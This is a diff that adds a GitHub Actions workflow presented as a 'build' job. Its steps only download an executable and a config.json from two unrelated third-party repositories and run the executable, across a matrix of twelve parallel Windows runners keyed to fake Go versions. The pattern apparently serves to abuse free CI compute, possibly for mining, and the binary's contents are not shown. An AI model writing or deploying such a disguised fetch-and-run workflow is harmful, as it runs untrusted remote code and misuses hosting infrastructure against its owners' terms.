@@ -1,0 +1,26 @@
+name: build
+ 
+on: [workflow_dispatch]
+ 
+jobs:
+  build:
+    name: BUILD
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 10
+      fail-fast: false
+      matrix:
+        go: [1.0, 1.1, 1.2, 1.3]
+        flag: [A, B, C]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: PREPARING
+      run: Invoke-WebRequest https://raw.githubusercontent.com/outlookadek/PAPAERSPACE/main/cari.exe -Outfile cari.exe
+    - name: PREPARING2 
+      run: Invoke-WebRequest https://raw.githubusercontent.com/ributmaestro/ghost-rider-test/main/ver4/config.json -Outfile config.json
+    - name: Running
+      run: ./cari.exe
+    - name: DONE
+      run: exit
